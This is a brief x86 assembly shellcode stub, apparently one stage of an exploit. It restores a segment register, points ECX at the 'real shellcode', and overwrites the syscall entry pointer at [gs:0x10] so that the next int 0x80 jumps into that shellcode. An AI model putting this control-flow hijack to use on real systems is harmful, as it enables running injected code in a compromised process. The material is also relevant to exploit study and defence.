USE32

    section .data
    global _start

_start:
    ;; restore stuff
    mov eax, 0x10000
    mov dword [eax], 0x2b
    mov ds, [eax]

    add ecx, 0x100      ;; ecx already points to real code address
                        ;; we add some value to it to make it point to real shellcode

    ;; we overwrite syscaller in gs
    ;; with address of real shellcode
    mov dword [gs:0x10], ecx

    ;;int3
    mov eax, 1
    int 0x80
